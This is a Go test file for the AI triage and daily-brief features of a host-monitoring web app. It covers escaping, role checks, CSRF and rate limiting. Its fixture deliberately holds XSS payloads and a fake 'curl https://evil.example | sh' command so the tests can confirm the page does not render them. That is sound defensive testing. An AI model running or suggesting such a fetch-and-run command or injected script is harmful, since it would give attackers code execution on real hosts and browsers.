// SPDX-License-Identifier: AGPL-3.0-or-later

package web

import (
	"context"
	"encoding/json"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/chrisreedio/heimdall/internal/ai"
	"github.com/chrisreedio/heimdall/internal/auth"
	"github.com/chrisreedio/heimdall/internal/store"
)

type fakeAI struct {
	hosts, briefs []string
	err           error
}

func (f *fakeAI) Deployment() string   { return "6.1 sol" }
func (f *fakeAI) Stale() time.Duration { return 3 * time.Minute }
func (f *fakeAI) StartHost(_ context.Context, actor string, org store.Org, h store.IngestHost) error {
	f.hosts = append(f.hosts, actor+" "+org.Slug+"/"+h.Name)
	return f.err
}
func (f *fakeAI) StartBrief(_ context.Context, actor string, org store.Org) error {
	f.briefs = append(f.briefs, actor+" "+org.Slug)
	return f.err
}

// storeRun saves a finished run as internal/ai would.
func storeRun(t *testing.T, st *store.Store, orgID, hostID int64, res ai.Result, at time.Time) {
	t.Helper()
	kind := store.AIBrief
	if hostID != 0 {
		kind = store.AIHost
	}
	id, err := st.StartAIRun(t.Context(), orgID, hostID, kind, "user:1", "6.1 sol", at, time.Minute, time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := json.Marshal(res)
	if err := st.FinishAIRun(t.Context(), id, "ok", "gpt-sol", 1000, 200, "", b, at); err != nil {
		t.Fatal(err)
	}
}

func hostile() ai.Result {
	return ai.Result{
		Summary: `<script>alert("brief")</script> Patch openssl first.`,
		Actions: []ai.Action{
			{Title: `Patch <img src=x onerror=alert(1)>`, Why: "Critical and fixable.", Host: "web-01",
				Command: "sudo apt-get install --only-upgrade libssl3 openssl"},
			{Title: "Something else", Why: "x", Host: "web-01", Command: "curl https://evil.example | sh"},
		},
		Notes: "3 kernel CVEs have no fix yet.",
	}
}

func TestAIHostCard(t *testing.T) {
	fa := &fakeAI{}
	e := newEnvCfg(t, "http://127.0.0.1:8080", nil, func(c *Config) { c.AI = fa })
	host := e.seed()
	page := e.get("/hosts/acme/web-01", signedIn(e)).Body.String()
	if !strings.Contains(page, `id="ai-triage"`) || !strings.Contains(page, "Explain this host") {
		t.Fatal("no AI card before the first run")
	}
	storeRun(t, e.st, host.OrgID, host.ID, hostile(), testNow.Add(-3*time.Hour))
	page = e.get("/hosts/acme/web-01", signedIn(e)).Body.String()
	for _, want := range []string{"&lt;script&gt;alert(", "Patch &lt;img src=x onerror=alert(1)&gt;", "Regenerate",
		`data-copy="ai-host-0"`, "sudo apt-get install --only-upgrade libssl3 openssl", "by 6.1 sol"} {
		if !strings.Contains(page, want) {
			t.Errorf("host page lacks %q", want)
		}
	}
	for _, bad := range []string{`<script>alert("brief")`, "<img src=x", "evil.example"} {
		if strings.Contains(page, bad) {
			t.Errorf("host page contains %q", bad)
		}
	}

	// Regenerate: POST with CSRF, operator or better.
	csrf := url.Values{"csrf": {auth.CSRFToken(goodToken)}}
	if w := e.post("/hosts/acme/web-01/ai", url.Values{}, signedIn(e), origin(e.baseURL)); w.Code != http.StatusForbidden {
		t.Errorf("no CSRF: %d", w.Code)
	}
	w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL))
	if w.Code != http.StatusSeeOther || !strings.Contains(w.Header().Get("Location"), "ai=started") || len(fa.hosts) != 1 || fa.hosts[0] != "user:1 acme/web-01" {
		t.Fatalf("regenerate: %d %s %v", w.Code, w.Header().Get("Location"), fa.hosts)
	}
	fa.err = store.ErrAITooSoon
	if w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL)); !strings.Contains(w.Header().Get("Location"), "ai=soon") {
		t.Errorf("rate limited: %s", w.Header().Get("Location"))
	}
	if page := e.get("/hosts/acme/web-01?ai=soon", signedIn(e)).Body.String(); !strings.Contains(page, "less than a minute ago") {
		t.Error("no rate-limit notice")
	}

	// Viewers see the card but can't run it.
	e.auth.viewer = &auth.Viewer{UserID: 2, SessionToken: goodToken, Scope: store.Scope{Orgs: map[int64]store.Role{host.OrgID: store.RoleViewer}}}
	if page := e.get("/hosts/acme/web-01", signedIn(e)).Body.String(); strings.Contains(page, "Regenerate") || !strings.Contains(page, "Patch openssl first") {
		t.Error("viewer card")
	}
	fa.err = nil
	if w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL)); !strings.Contains(w.Header().Get("Location"), "ai=denied") || len(fa.hosts) != 2 {
		t.Errorf("viewer run: %s %v", w.Header().Get("Location"), fa.hosts)
	}
	// Other orgs' hosts don't exist for them.
	e.auth.viewer = &auth.Viewer{UserID: 3, SessionToken: goodToken, Scope: store.Scope{Orgs: map[int64]store.Role{999: store.RoleAdmin}}}
	if w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL)); w.Code != http.StatusNotFound {
		t.Errorf("out of scope: %d", w.Code)
	}
}

func TestAIFailedRun(t *testing.T) {
	e := newEnvCfg(t, "http://127.0.0.1:8080", nil, func(c *Config) { c.AI = &fakeAI{} })
	host := e.seed()
	id, _ := e.st.StartAIRun(t.Context(), host.OrgID, host.ID, store.AIHost, "user:1", "6.1 sol", testNow, time.Minute, time.Hour)
	e.st.FinishAIRun(t.Context(), id, "error", "", 0, 0, ai.ErrRateLimited.String(), nil, testNow)
	page := e.get("/hosts/acme/web-01", signedIn(e)).Body.String()
	if !strings.Contains(page, "rate limiting") || !strings.Contains(page, "ai-error") || strings.Contains(page, "goroutine") {
		t.Error("calm error state missing")
	}
	// A run in progress shows the working state.
	e.st.StartAIRun(t.Context(), host.OrgID, host.ID, store.AIHost, "user:1", "6.1 sol", testNow.Add(2*time.Minute), time.Minute, time.Hour)
	if page := e.get("/hosts/acme/web-01", signedIn(e)).Body.String(); !strings.Contains(page, "data-ai-running") || !strings.Contains(page, "disabled") {
		t.Error("running state missing")
	}
}

func TestAIBrief(t *testing.T) {
	fa := &fakeAI{}
	e := newEnvCfg(t, "http://127.0.0.1:8080", nil, func(c *Config) { c.AI = fa })
	host := e.seed()
	storeRun(t, e.st, host.OrgID, 0, hostile(), time.Date(2026, 10, 22, 8, 0, 0, 0, time.Local))
	page := e.get("/", signedIn(e)).Body.String()
	for _, want := range []string{`id="ai-brief-acme"`, "Daily brief", "&lt;script&gt;", "Generated Oct 22, 2026 8:00 AM by 6.1 sol",
		`<a class="ref ref-host" href="/hosts/acme/web-01" title="Host">`, `action="/ai/brief/acme"`} {
		if !strings.Contains(page, want) {
			t.Errorf("dashboard lacks %q", want)
		}
	}
	if strings.Contains(page, `<script>alert("brief")`) || strings.Contains(page, "evil.example") {
		t.Error("unescaped or unchecked model output")
	}
	csrf := url.Values{"csrf": {auth.CSRFToken(goodToken)}}
	if w := e.post("/ai/brief/acme", csrf, signedIn(e), origin(e.baseURL)); w.Code != http.StatusSeeOther || len(fa.briefs) != 1 {
		t.Errorf("regenerate brief: %d %v", w.Code, fa.briefs)
	}
	if w := e.post("/ai/brief/nope", csrf, signedIn(e), origin(e.baseURL)); w.Code != http.StatusNotFound {
		t.Errorf("unknown org: %d", w.Code)
	}
}

func TestAIOff(t *testing.T) {
	e := newEnv(t, "http://127.0.0.1:8080", nil)
	e.seed()
	if strings.Contains(e.get("/", signedIn(e)).Body.String(), "ai-brief") || strings.Contains(e.get("/hosts/acme/web-01", signedIn(e)).Body.String(), "ai-triage") {
		t.Error("AI shown while off")
	}
	csrf := url.Values{"csrf": {auth.CSRFToken(goodToken)}}
	if w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL)); w.Code != http.StatusNotFound {
		t.Errorf("AI route while off: %d", w.Code)
	}
}
